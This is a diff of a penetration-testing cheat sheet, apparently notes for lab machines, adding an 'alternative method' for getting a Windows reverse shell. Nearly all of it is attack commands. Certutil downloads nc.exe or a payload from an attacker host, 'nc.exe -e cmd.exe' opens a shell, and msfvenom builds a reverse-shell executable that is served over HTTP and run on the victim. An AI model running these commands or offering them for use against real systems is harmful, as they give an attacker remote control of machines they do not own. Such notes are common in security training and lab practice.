@@ -198,6 +198,14 @@ Password Protected SSH Private Key:
 			- mkdir C:\temp
 			- certutil -f -split -urlcache http://10.10.XX.XX/nc.exe C:\temp\nc.exe
 			- C:\temp\nc.exe -e cmd.exe 10.10.XX.XX 1234
+		- Alternative method: 
+			- On attacker
+				- msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.10.14.7 LPORT=1234 -f exe > shell.exe
+				- nc -lnvp 1234
+				- python -m SimpleHTTPServer 80
+			- On victim
+				- download shell: certutil -f -split -urlcache http://10.10.16.23/shell.exe C:\temp\shell.exe
+				- execute it: C:\temp\shell.exe
 			
 	- impacket
 		- Start SMB server: impacket-smbserver smb Downloads/ 
